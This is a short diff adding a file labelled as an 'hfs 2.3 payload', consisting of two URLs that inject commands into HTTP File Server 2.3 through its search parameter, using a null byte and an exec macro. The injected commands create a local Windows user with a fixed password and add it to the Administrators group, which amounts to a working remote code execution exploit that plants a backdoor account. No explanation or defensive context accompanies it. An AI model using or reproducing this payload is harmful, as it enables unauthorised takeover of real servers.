@@ -1,0 +1,3 @@
+hfs 2.3 payload
+http://127.0.0.1/?search==%00{.exec|cmd /c net user DEF DEFHACKER123 /add.} 
+http://127.0.0.1/?search==%00{.exec|cmd /c net localgroup Administrators DEF /add.}
